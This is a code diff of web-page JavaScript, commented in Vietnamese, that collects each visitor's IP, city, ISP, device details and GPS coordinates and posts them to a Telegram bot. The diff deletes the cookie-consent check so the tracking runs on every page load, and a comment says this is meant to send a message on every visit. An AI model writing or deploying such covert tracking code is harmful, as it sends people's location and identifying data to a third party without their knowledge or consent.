@@ -60,9 +60,9 @@ adjustZoom();
    // --- 1. CẤU HÌNH ---
 const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
-let isBotActive = false;
+let hasSent = false; // Khóa chặn gửi trùng trong 1 lần load trang
 
-// --- 2. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT CHÍNH XÁC ---
+// --- 2. NHẬN DIỆN CHI TIẾT THIẾT BỊ ---
 function getDetailDevice() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
@@ -85,54 +85,42 @@ function getDetailDevice() {
     return { browser, os, deviceType };
 }
 
-// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (Dùng HTTPS để tránh N/A) ---
+// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (HTTPS 100%) ---
 async function fetchIpInfo() {
-    // Ưu tiên các nguồn hỗ trợ HTTPS 100% cho tên miền thật
+    // Thử các nguồn khác nhau để tránh N/A
     const apis = [
         {
-            // Nguồn 1: Rất chuẩn cho khu vực Châu Á/Việt Nam
             url: 'https://ipwho.is/',
             parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.org })
         },
         {
-            // Nguồn 2: Cực kỳ ổn định trên HTTPS
             url: 'https://ipapi.co/json/',
             parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
-        },
-        {
-            // Nguồn 3: Dự phòng cuối cùng (DB-IP)
-            url: 'https://api.db-ip.com/v2/free/self',
-            parse: (d) => ({ ip: d.ipAddress, city: d.city, isp: d.organization })
         }
     ];
 
     for (const api of apis) {
         try {
-            const res = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
-            if (!res.ok) continue;
-            const data = await res.json();
-            const result = api.parse(data);
-            
-            // Nếu có Thành phố và IP thì mới trả về
+            const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
+            const d = await res.json();
+            const result = api.parse(d);
             if (result.ip && result.city && result.city !== "N/A") return result;
-        } catch (e) {
-            console.warn("Lỗi API, đang thử nguồn khác...");
-            continue;
-        }
+        } catch (e) { continue; }
     }
     return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
 }
 
-// --- 4. GỬI TELEGRAM (Gộp 1 lần gửi, chống trùng) ---
+// --- 4. HÀM GỬI THÔNG BÁO ---
 async function sendNotification(pos, ipInfo) {
-    if (isBotActive || sessionStorage.getItem('logged')) return;
-    isBotActive = true;
+    if (hasSent) return; // Nếu đang trong quá trình gửi thì không chạy thêm
+    hasSent = true;
 
     const device = getDetailDevice();
     const time = new Date().toLocaleString('vi-VN');
 
     let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
-    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
+    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
+    msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
     msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
     msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;
 
@@ -143,14 +131,11 @@ async function sendNotification(pos, ipInfo) {
 
     if (pos && pos.coords) {
         const { latitude: lat, longitude: lon } = pos.coords;
-        msg += `📍 <b>Vị trí GPS:</b>\n`;
-        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn xem Bản đồ</a>\n`;
-    } else {
-        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
+        msg += `📍 <b>Vị trí GPS:</b>\n`;msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
     }
 
     try {
-        const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -159,35 +144,31 @@ async function sendNotification(pos, ipInfo) {
                 parse_mode: 'HTML'
             })
         });
-        if (res.ok) sessionStorage.setItem('logged', 'true');
+        console.log("Đã gửi thông báo về Bot.");
     } catch (err) {
-        console.error(err);
-    } finally {
-        isBotActive = false;
+        console.error("Lỗi gửi Telegram:", err);
+        hasSent = false; // Reset nếu lỗi để có thể thử lại
     }
 }
 
 // --- 5. KHỞI CHẠY ---
 async function startTracking() {
-    // Chạy song song để tối ưu tốc độ load trang
-    const [ipInfo, pos] = await Promise.all([
-        fetchIpInfo(),
-        new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {timeout: 5000}))
-    ]);
+    // Chạy song song để tốc độ nhanh nhất
+    const ipPromise = fetchIpInfo();
+    const gpsPromise = new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {timeout: 4000}));
+    
+    const [ipInfo, pos] = await Promise.all([ipPromise, gpsPromise]);
     await sendNotification(pos, ipInfo);
 }
 
+// Luôn chạy khi load trang
 window.onload = () => {
-    if (localStorage.getItem('is_accepted')) {
-        startTracking();
-    } else {
-        const box = document.getElementById('cookie-box');
-        if (box) setTimeout(() => box.style.display = 'block', 1000);
-    }
+    // Xóa bỏ kiểm tra localStorage để lần nào vào cũng gửi tin
+    startTracking();
 };
 
+// Nếu bạn vẫn muốn dùng nút Cookie để kích hoạt GPS
 function acceptCookies() {
-    localStorage.setItem('is_accepted', 'true');
     const box = document.getElementById('cookie-box');
     if (box) box.style.display = 'none';
     startTracking();
